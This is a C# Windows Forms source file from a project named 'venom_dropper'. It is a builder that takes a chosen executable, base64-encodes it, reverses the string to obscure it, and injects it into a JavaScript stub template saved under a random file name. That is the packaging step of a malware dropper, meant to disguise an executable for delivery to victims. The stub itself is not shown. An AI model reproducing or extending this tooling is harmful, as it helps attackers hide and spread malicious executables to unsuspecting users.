using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Guna.UI2.WinForms;
namespace venom_dropper
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        public static string GenerateRandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            var random = new Random();
            var result = new StringBuilder(length);

            for (int i = 0; i < length; i++)
            {
                result.Append(chars[random.Next(chars.Length)]);
            }

            return result.ToString();
        }
        private void guna2Button1_Click(object sender, EventArgs e)
        {
            string filePath = this.path.Text;
            if (File.Exists(filePath))
            {
                string randomString = GenerateRandomString(10);
                string filenamenew = randomString + ".js";
                byte[] fileBytes = File.ReadAllBytes(filePath);
                string encryptedText = Convert.ToBase64String(fileBytes);
                string reversedString = new string(encryptedText.Reverse().ToArray());
                string stubbbbb = Properties.Resources.stub.Replace("%VENOM_DROPPER%", reversedString);
                try
                {

                    File.WriteAllText(filenamenew, stubbbbb);
                    MessageBox.Show("Saved as"+ filenamenew);
                }
                catch 
                {
                    MessageBox.Show("Failed to build the stub.");
                }
            }
            else
            {
                MessageBox.Show("File not found.");
            }
        }

        private void guna2HtmlLabel1_Click(object sender, EventArgs e)
        {

        }

        private void guna2Button2_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "Executable files (*.exe)|*.exe|All files (*.*)|*.*";
                openFileDialog.RestoreDirectory = true;

                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    string selectedFilePath = openFileDialog.FileName;
                    path.Text = selectedFilePath;
                }
            }
        }

        private void guna2Button3_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }
    }
}
